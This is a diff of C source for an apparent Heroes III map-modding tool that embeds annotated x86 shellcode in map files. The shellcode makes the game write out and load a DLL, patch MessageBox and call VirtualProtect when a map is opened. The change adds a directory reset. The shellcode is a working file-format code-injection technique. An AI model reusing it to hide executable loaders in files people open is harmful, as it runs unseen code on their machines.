@@ -230,11 +230,13 @@ struct shellcode_eof_load_dll_t {
     uint32_t GetModuleHandleA2;
     uint8_t c2_4[7];
     uint32_t GetProcAddress2;
-    uint8_t c2_5[40];
+    uint8_t c2_5[22];
+    uint32_t SetCurrentDirectoryA;
+    uint8_t c2_6[24];
     uint32_t orig_retn;
-    uint8_t c2_6[4];
+    uint8_t c2_7[4];
     uint32_t map_format;
-    uint8_t c2_7[64]; // contains s: (strings) as well
+    uint8_t c2_8[67]; // contains s: (strings) as well
     uint8_t dll[];
 };
 
@@ -248,7 +250,7 @@ static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
     0x6A, 0x00,                                     // PUSH 0
     0x6A, 0x03,                                     // PUSH 3
     0x68, 0x00, 0x00, 0x00, 0x40,                   // PUSH 40000000
-    0x8D, 0xB5, 0xAE, 0x00, 0x00, 0x00,             // LEA ESI, [EBP + 0AE] ; str "h3m_code.dll", from below
+    0x8D, 0xB5, 0xB8, 0x00, 0x00, 0x00,             // LEA ESI, [EBP + 0B8] ; str "h3m_code.dll", from below
     0x56,                                           // PUSH ESI
     0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.CreateFileA>]
     0x89, 0xC3,                                     // MOV EBX, EAX
@@ -285,9 +287,13 @@ static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
     0x53,                                           // PUSH EBX
     0xFF, 0xD7,                                     // CALL EDI
     0xC7, 0x03, 0xC2, 0x10, 0x00, 0x00,             // MOV DWORD PTR DS : [EBX], 10C2 ; patch MessageBox function to RETN 4
+    // Reset current directory which was set to maps subfolder
+    0x83, 0xC6, 0x0F,                               // ADD ESI, 0F ; str ".."
+    0x56,                                           // PUSH ESI
+    0xFF, 0x15, 0x12, 0x34, 0x56, 0x78,             // CALL DWORD PTR DS : [<&KeRNeL32.SetCurrentDirectoryA>]
     // Call target specific shellcode to prevent crashes
     0x89, 0xF0,                                     // MOV EAX, ESI
-    0x83, 0xC0, 0x0F,                               // ADD EAX, 0F ; point to target specific shellcode (past end of this buffer)
+    0x83, 0xC0, 0x03,                               // ADD EAX, 3 ; point to target specific shellcode (past end of this buffer)
     0xFF, 0xD0,                                     // CALL EAX ; CALL target specific shellcode
     // Restore state
     0x61,                                           // POPAD
@@ -304,9 +310,10 @@ static const uint8_t SHELLCODE_EOF_LOAD_DLL[] = {
     0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x00,                                                   // "user32"
     0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41, 0x00,                     // "MessageBoxA"
     0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x33, 0x32, 0x00,                                       // "kernel32"
-    0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x00    // "VirtualProtect"
+    0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x50, 0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x00,   // "VirtualProtect"
+    0x2E, 0x2E, 0x00                                                                            // ".."
 
-    // Here comes version specific shellcode that is called above
+    // Here comes target specific shellcode called above
 };
 
 static const uint8_t TARGET_FIX_H3COMPLETE[] = {
@@ -372,7 +379,7 @@ static const uint8_t TARGET_FIX_HDMOD[] = {
     0x53,                                           // PUSH EBX
     0xFF, 0xD7,                                     // CALL EDI ; Call VirtualProtect()
 
-    // Set initial object counter to 1, so that the loop exits 1 iteration earlier and skips our bugged object
+    // Set initial object counter to 1, so that a loop exits 1 iteration earlier and skips our bugged object
     0xC7, 0x84, 0xE4, 0x94, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, // MOV DWORD PTR SS : [ESP + 94], 1
 
     // Remove instruction that sets initial object counter value to 0
@@ -511,6 +518,7 @@ int h3m_modembed_write_eof_dll(const struct H3M_MODEMBED *hm, uint32_t fm, FILE 
     shellcode_eof->GetProcAddress1 = iat->GetProcAddress;
     shellcode_eof->GetProcAddress2 = iat->GetProcAddress;
     shellcode_eof->LoadLibraryA = iat->LoadLibraryA;
+    shellcode_eof->SetCurrentDirectoryA = iat->SetCurrentDirectoryA;
     shellcode_eof->WriteFile = iat->WriteFile;
     shellcode_eof->dll_size = hm->dll_size;
     shellcode_eof->dll_offset = dll_offset;
